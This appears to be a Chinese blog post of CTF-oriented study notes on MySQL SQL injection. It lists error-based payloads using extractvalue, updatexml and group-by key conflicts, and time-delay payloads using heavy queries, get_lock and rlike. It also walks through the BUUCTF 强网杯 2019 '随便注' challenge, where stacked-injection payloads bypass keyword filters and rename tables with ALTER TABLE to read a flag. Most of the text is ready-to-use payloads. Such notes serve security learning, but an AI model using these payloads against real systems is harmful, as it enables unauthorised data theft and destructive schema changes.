---
title: SQL注入
date: {{ date }}
top: false
cover: false
password:
toc: true
mathjax: true
summary:
tags: SQL注入
categories: SQL注入
---



# SQL注入

## 联合注入



## 报错注入

### group by重复键冲突

- 多种形式payload：

  ```sql
  select count(*),(concat(floor(rand(0)*2),'%',(select version()),'%'))x from information_schema.tables group by x;
  ```

  ```sql
  select concat(left(rand(),3),'%',(select version()),'%')x,count(*) from information_schema.tables group by x;
  ```

  注：输出字符长度限制为64个字符

### XPATH报错

在MySQL高于5.1版本中添加了对XML文档进行查询和修改的函数:

- extractvalue()

  ```sql
  EXTRACTVALUE (XML_document, XPath_string);
  ```

  - 对XML文档进行查询的函数
  - 语法：extractvalue(目标xml文档，xml路径)

  ```sql
  ?id=1 and extractvalue(1,concat('%',(select version()),'%')) --+
  ```

- updatexml()

  - updatexml()函数与extractvalue()类似，是更新xml文档的函数
  - 语法：updatexml(目标xml文档，xml路径，更新的内容)

  ```sql
  ?id=1 and updatexml(1,concat('%',(select version()),'%'),1) --+
  ```

当这两个函数在执行时,如果出现xml文档路径错误就会产生

注：输出字符有长度限制，最长32位

### ExtractValue报错

```sql
and extractvalue(1, payload)
and extractvalue(1, concat(0x7e,@@version,0x7e))
```

注：输出字符有长度限制，最长32位

## 堆叠注入

什么是堆叠注入：使用分号结束上一个语句再叠加其他语句一起执行

[参考](https://zhuanlan.zhihu.com/p/78989602)

例题来自BUUCTF-[强网杯 2019]随便注1

- 打开后查看源码![image-20201115212459552](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212459552.png)![image-20201115212514056](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212514056.png)

- 所以就手工注入吧。尝试单引号，发现报错

  ![image-20201115212619437](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212619437.png)

  显然是但引号闭合，尝试闭合，发现没问题![image-20201115212729519](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212729519.png)

- 有报错，有回显，那就从**联合注入**开始。发现到order by 3时报错，即有两个字段![image-20201115212924226](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212924226.png)

- select查询发现被过滤![image-20201115213016731](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115213016731.png)

- **多行注释**、**大小写**、**双写**均无法绕过，并且由于update被过滤，无法用**updatexml报错**，尝试**ExtractValue报错**![image-20201115213531495](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115213531495.png)

- **ExtractValue报错**可行，不过也到此为止。这时考虑**堆叠注入**，发现可行![image-20201115213647092](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115213647092.png)

- 查出当前可查的表![image-20201115214021920](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115214021920.png)

- 用desc查看表结构的详细信息![image-20201115214113905](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115214113905.png)

  此处查询表名为数字、关键字时，使用反引号将其包裹，否则会出现错误![image-20201115215139041](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115215139041.png)

- 我们可以得知flag存在于supersqli数据库中\`1919810931114514\`表的flag字段。

- 最终payload有两种

  - 预编译相关语法如下：
  
    ```text
    set用于设置变量名和值
    prepare用于预备一个语句，并赋予名称，以后可以引用该语句
    execute执行语句
    deallocate prepare用来释放掉预处理的语句
    ```

    ```sql
    -1';set @sql = CONCAT('se','lect * from   `1919810931114514`;');prepare stmt from @sql;EXECUTE stmt;#
    
    拆分开来如下
    -1';
    set @sql = CONCAT('se','lect * from `1919810931114514`;');
    prepare stmt from @sql;
    EXECUTE stmt;
    #
    ```
    
    结果为：![image-20201115220307215](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115220307215.png)
    
    这里检测到了set和prepare关键词，但strstr这个函数并不能区分大小写，我们将其大写即可。
    
    ```mysql
    -1';Set @sql = CONCAT('se','lect * from `1919810931114514`;');Prepare stmt from @sql;EXECUTE stmt;#
    
    拆分开来如下：
    -1';
    Set @sql = CONCAT('se','lect * from `1919810931114514`;');
    Prepare stmt from @sql;
    EXECUTE stmt;
    #
    ```
    
    结果为：![image-20201115220501035](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115220501035.png)
    
  - **更改表名列名**
  
    修改表名和列名的语法如下：
    
    ```text
    修改表名(将表名user改为users)
    alter table user rename to users;
    
    修改列名(将字段名username改为name)
    alter table users change uesrname name varchar(30);
    ```
    
    最终payload如下：
    
    ```mysql
    1'; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#
    
    拆分开来如下
    1';
    alter table words rename to words1;
    alter table `1919810931114514` rename to words;
    alter table words change flag id varchar(50);
    #
    ```
    
    然后使用`1' or 1=1#`即可查询出flag

## 布尔注入

## 时间盲注

### sleep



### benchmark



### heavy query

heavy query顾名思义就是通过做大量的查询导致查询时间较长来达到延时的目的。

- 笛卡尔积

  ```sql
  SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;
  ```

- get_lock

  延时精确可控，利用环境有限，需要开两个session测试。

  ```sql
  select get_lock('test',1);
  ```

  ```sql
  select get_lock('test',5);
  ```

- rlike

  通过`rpad`或`repeat`构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。

  ```sql
  select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');
  ```

  

